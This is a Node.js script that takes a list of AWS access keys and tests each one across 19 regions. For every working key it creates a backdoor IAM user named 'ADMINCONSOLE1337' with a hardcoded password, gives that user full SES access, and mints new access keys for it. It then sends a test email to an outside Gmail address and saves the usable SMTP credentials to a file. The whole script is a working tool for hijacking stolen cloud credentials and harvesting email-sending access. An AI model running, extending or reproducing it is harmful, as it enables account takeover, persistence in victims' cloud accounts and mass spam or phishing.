const AWS = require('aws-sdk');
const fs = require('fs');
const readline = require('readline');
const nodemailer = require('nodemailer');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

const emailRecipient = 'emailbuatus2@gmail.com';
const iamUserName = 'ADMINCONSOLE1337'; // Ubah nama pengguna IAM sesuai kebutuhan Anda

const regions = [
  'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2',
  'af-south-1', 'ap-east-1', 'ap-south-1', 'ap-southeast-1', 'ap-southeast-2',
  'ap-southeast-3', 'ca-central-1', 'eu-central-1', 'eu-north-1', 'eu-south-1',
  'eu-west-1', 'eu-west-2', 'eu-west-3', 'me-south-1', 'sa-east-1'
];

const smtpHosts = {
  'us-east-1': 'email-smtp.us-east-1.amazonaws.com',
  'us-east-2': 'email-smtp.us-east-2.amazonaws.com',
  'us-west-1': 'email-smtp.us-west-1.amazonaws.com',
  'us-west-2': 'email-smtp.us-west-2.amazonaws.com',
  'af-south-1': 'email-smtp.af-south-1.amazonaws.com',
  'ap-east-1': 'email-smtp.ap-east-1.amazonaws.com',
  'ap-south-1': 'email-smtp.ap-south-1.amazonaws.com',
  'ap-southeast-1': 'email-smtp.ap-southeast-1.amazonaws.com',
  'ap-southeast-2': 'email-smtp.ap-southeast-2.amazonaws.com',
  'ap-southeast-3': 'email-smtp.ap-southeast-3.amazonaws.com',
  'ca-central-1': 'email-smtp.ca-central-1.amazonaws.com',
  'eu-central-1': 'email-smtp.eu-central-1.amazonaws.com',
  'eu-north-1': 'email-smtp.eu-north-1.amazonaws.com',
  'eu-south-1': 'email-smtp.eu-south-1.amazonaws.com',
  'eu-west-1': 'email-smtp.eu-west-1.amazonaws.com',
  'eu-west-2': 'email-smtp.eu-west-2.amazonaws.com',
  'eu-west-3': 'email-smtp.eu-west-3.amazonaws.com',
  'me-south-1': 'email-smtp.me-south-1.amazonaws.com',
  'sa-east-1': 'email-smtp.sa-east-1.amazonaws.com'
};

// ANSI escape codes for colors
const colors = {
  reset: "\x1b[0m",
  bright: "\x1b[1m",
  dim: "\x1b[2m",
  underscore: "\x1b[4m",
  blink: "\x1b[5m",
  reverse: "\x1b[7m",
  hidden: "\x1b[8m",

  fg: {
    black: "\x1b[30m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",
    crimson: "\x1b[38m" // Scarlet
  },
  bg: {
    black: "\x1b[40m",
    red: "\x1b[41m",
    green: "\x1b[42m",
    yellow: "\x1b[43m",
    blue: "\x1b[44m",
    magenta: "\x1b[45m",
    cyan: "\x1b[46m",
    white: "\x1b[47m",
    crimson: "\x1b[48m"
  }
};

async function checkAWSKey(region, accessKeyId, secretAccessKey, keyIndex, totalKeys) {
  const ses = new AWS.SES({
    accessKeyId,
    secretAccessKey,
    region
  });

  try {
    const quota = await ses.getSendQuota().promise();
    console.log(`\n${colors.fg.green}✅ AWS Key [${keyIndex}/${totalKeys}] is valid in region: ${colors.fg.blue}${region}${colors.reset}`);
    console.log(`${colors.fg.green}✅ Send Quota: ${quota.Max24HourSend} emails/24 hours, ${quota.MaxSendRate} emails/second${colors.reset}`);
    return quota;
  } catch (error) {
    console.error(`\n${colors.fg.red}❌ AWS Key [${keyIndex}/${totalKeys}] is not valid in region: ${colors.fg.blue}${region}${colors.reset}\nError: ${colors.fg.red}${error.message}${colors.reset}`);
    return null;
  }
}

async function createIAMUser(iam, userName, password) {
  try {
    const response = await iam.createUser({ UserName: userName }).promise();
    const userArn = response.User.Arn;
    console.log(`${colors.fg.green}✅ IAM user created: ${colors.fg.blue}${userName}${colors.reset}`);

    await iam.createLoginProfile({
      UserName: userName,
      Password: password,
      PasswordResetRequired: false
    }).promise();
    console.log(`${colors.fg.green}✅ Password set for IAM user: ${colors.fg.blue}${userName}${colors.reset}`);

    const userDetails = {
      userName,
      password,
      arn: userArn
    };

    await saveAccountDetails(userDetails, 'iamAccountDetails.txt', null);
    return userArn;
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to create IAM user: ${colors.fg.red}${error.message}${colors.reset}`);
    throw error;
  }
}

async function attachPolicy(iam, userName, policyArn) {
  try {
    await iam.attachUserPolicy({ UserName: userName, PolicyArn: policyArn }).promise();
    console.log(`${colors.fg.green}✅ Policy attached to user: ${colors.fg.blue}${userName}${colors.reset}`);
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to attach policy: ${colors.fg.red}${error.message}${colors.reset}`);
    throw error;
  }
}

async function createAccessKey(iam, userName) {
  try {
    const accessKey = await iam.createAccessKey({ UserName: userName }).promise();
    console.log(`${colors.fg.green}✅ Access key created for user: ${colors.fg.blue}${userName}${colors.reset}`);
    return accessKey.AccessKey;
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to create access key: ${colors.fg.red}${error.message}${colors.reset}`);
    throw error;
  }
}

async function getFirstVerifiedEmail(ses) {
  try {
    const data = await ses.listIdentities({ IdentityType: 'EmailAddress' }).promise();
    const verifiedEmails = data.Identities || [];
    const firstVerifiedEmail = verifiedEmails.length > 0 ? verifiedEmails[0] : 'Not available';
    console.log(`${colors.fg.green}✅ First verified email address: ${colors.fg.blue}${firstVerifiedEmail}${colors.reset}`);
    return firstVerifiedEmail;
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to list verified email addresses: ${colors.fg.red}${error.message}${colors.reset}`);
    return 'Not available';
  }
}

async function saveAccountDetails(details, fileName, quota) {
  try {
    const formattedDetails = `
    --------------------------------------------------
    Region: ${details.region || 'N/A'}
    Access Key ID: ${details.accessKeyId || 'N/A'}
    Secret Access Key: ${details.secretAccessKey || 'N/A'}
    User Name: ${details.userName || 'N/A'}
    Password: ${details.password || 'N/A'}
    ARN: ${details.arn || 'N/A'}
    SMTP Host: ${details.smtpHost || 'N/A'}
    SMTP Username: ${details.smtpUsername || 'N/A'}
    SMTP Password: ${details.smtpPassword || 'N/A'}
    First Verified Email: ${details.firstVerifiedEmail || 'Not available'}
    ${quota ? `Send Quota: ${quota.Max24HourSend} emails/24 hours, ${quota.MaxSendRate} emails/second` : ''}
    --------------------------------------------------
    `;
    fs.appendFileSync(fileName, formattedDetails);
    console.log(`${colors.fg.green}✅ Account details saved to file: ${colors.fg.blue}${fileName}${colors.reset}`);
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to save account details: ${colors.fg.red}${error.message}${colors.reset}`);
  }
}

async function createSESService(region, accessKeyId, secretAccessKey, quota) {
  const sesUser = new AWS.SES({ accessKeyId, secretAccessKey, region });

  const fromEmail = await getFirstVerifiedEmail(sesUser);
  if (fromEmail === 'Not available') {
    console.error(`${colors.fg.red}❌ No verified email addresses found in region: ${colors.fg.blue}${region}${colors.reset}`);
    await saveFailureDetails(region, accessKeyId, secretAccessKey, 'No verified email addresses found', quota);
    return;
  }

  try {
    const transporter = nodemailer.createTransport({
      SES: sesUser
    });

    const mailOptions = {
      from: fromEmail,
      to: emailRecipient,
      subject: 'Test Email from AWS SES',
      text: 'This is a test email from AWS SES'
    };

    try {
      await transporter.sendMail(mailOptions);
      console.log(`${colors.fg.green}✅ Email sent successfully from region: ${colors.fg.blue}${region}${colors.reset}`);

      const emailDetails = {
        region,
        accessKeyId,
        secretAccessKey,
        smtpHost: smtpHosts[region],
        smtpUsername: accessKeyId,
        smtpPassword: secretAccessKey,
        firstVerifiedEmail: fromEmail
      };

      await saveAccountDetails(emailDetails, 'SMTPGOOD.txt', quota);
    } catch (error) {
      console.error(`${colors.fg.red}❌ Failed to send email from region: ${colors.fg.blue}${region}\nError: ${colors.fg.red}${error.message}${colors.reset}`);
      await saveFailureDetails(region, accessKeyId, secretAccessKey, error.message, quota);
    }
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to verify email in region: ${colors.fg.blue}${region}\nError: ${colors.fg.red}${error.message}${colors.reset}`);
  }
}

async function saveFailureDetails(region, accessKeyId, secretAccessKey, errorMessage, quota) {
  try {
    const failureDetails = `
    --------------------------------------------------
    Region: ${region || 'N/A'}
    Access Key ID: ${accessKeyId || 'N/A'}
    Secret Access Key: ${secretAccessKey || 'N/A'}
    Error Message: ${errorMessage || 'N/A'}
    ${quota ? `Send Quota: ${quota.Max24HourSend} emails/24 hours, ${quota.MaxSendRate} emails/second` : ''}
    --------------------------------------------------
    `;
    fs.appendFileSync('SMTPBAD.txt', failureDetails);
    console.log(`${colors.fg.red}❌ Failure details saved to file: failureDetails.txt${colors.reset}`);
  } catch (error) {
    console.error(`${colors.fg.red}❌ Failed to save failure details: ${colors.fg.red}${error.message}${colors.reset}`);
  }
}

async function processRegion(region, accessKeyId, secretAccessKey, keyIndex, totalKeys) {
  console.log(`\n${colors.fg.yellow}Processing AWS Key [${keyIndex}/${totalKeys}] in region: ${colors.fg.blue}${region}${colors.reset}`);
  console.log(`${colors.fg.yellow}Access Key ID: ${colors.fg.blue}${accessKeyId}|${secretAccessKey}${colors.reset}`);
  console.log('--------------------------------------------------');
  const quota = await checkAWSKey(region, accessKeyId, secretAccessKey, keyIndex, totalKeys);
  if (quota) {
    const iam = new AWS.IAM({ accessKeyId, secretAccessKey });
    const iamUserPassword = 'Ro00t1337'; // Setel password untuk pengguna IAM

    try {
      const userArn = await createIAMUser(iam, iamUserName, iamUserPassword);
      await attachPolicy(iam, iamUserName, 'arn:aws:iam::aws:policy/AmazonSESFullAccess');

      const { AccessKeyId, SecretAccessKey } = await createAccessKey(iam, iamUserName);

      await createSESService(region, AccessKeyId, SecretAccessKey, quota);

    } catch (error) {
      console.error(`${colors.fg.red}❌ Failed to create IAM user or attach policy in region: ${colors.fg.blue}${region}${colors.fg.red}. Skipping IAM and proceeding with SES only.${colors.reset}`);
      await createSESService(region, accessKeyId, secretAccessKey, quota);
    }
  }
  console.log('--------------------------------------------------');
}

async function processAllRegions(keys, numThreads) {
  const totalKeys = keys.length;

  let keyIndex = 0;
  const tasks = keys.flatMap((key, index) => {
    const [accessKeyId, secretAccessKey] = key.split('|');
    return regions.map(region => ({
      keyIndex: index + 1,
      totalKeys,
      region,
      accessKeyId,
      secretAccessKey
    }));
  });

  const chunkSize = Math.ceil(tasks.length / numThreads);
  const chunks = Array.from({ length: numThreads }, (_, i) => tasks.slice(i * chunkSize, (i + 1) * chunkSize));

  const workers = chunks.map(chunk => new Promise((resolve, reject) => {
    const worker = new Worker(__filename, {
      workerData: chunk
    });

    worker.on('message', resolve);
    worker.on('error', reject);
    worker.on('exit', (code) => {
      if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
    });
  }));

  await Promise.all(workers);
}

if (isMainThread) {
  async function readKeysFromFile(filePath) {
    return new Promise((resolve, reject) => {
      fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
          reject(err);
        } else {
          const keys = data.trim().split('\n').map(line => line.trim()).filter(line => line);
          resolve(keys);
        }
      });
    });
  }

  async function main() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    rl.question('Please input your AWS keys file path AWS_KEY|AWS_SEC : ', (filePath) => {
      rl.question('Please input the number of threads: ', async (numThreads) => {
        try {
          const keys = await readKeysFromFile(filePath);
          await processAllRegions(keys, parseInt(numThreads, 10));
        } catch (error) {
          console.error('❌ Failed to read keys from file:', error.message);
        } finally {
          rl.close();
        }
      });
    });
  }

  main().catch(error => {
    console.error('❌ An error occurred:', error.message);
  });
} else {
  (async () => {
    for (const task of workerData) {
      await processRegion(task.region, task.accessKeyId, task.secretAccessKey, task.keyIndex, task.totalKeys);
    }
    parentPort.postMessage('done');
  })();
}
